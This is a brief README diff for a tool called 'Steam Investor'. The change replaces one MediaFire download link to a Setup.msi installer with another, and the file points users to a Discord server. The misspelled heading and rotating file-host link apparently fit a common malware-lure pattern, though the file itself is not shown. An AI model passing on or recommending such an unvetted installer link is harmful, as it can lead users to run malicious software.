@@ -1,4 +1,4 @@
-# [Dowload here](http://download1587.mediafire.com/1tojsmtp1big/si5ku94ddr7848g/Setup.msi) Steam Investor v1.1.4  (Beta)
+# [Dowload here](http://download1587.mediafire.com/6ud8pe004jhg/si5ku94ddr7848g/Setup.msi) Steam Investor v1.1.4  (Beta)
  
 Join the [Discord](https://discord.gg/x4kuTWW) if you have any questions or problems.
 
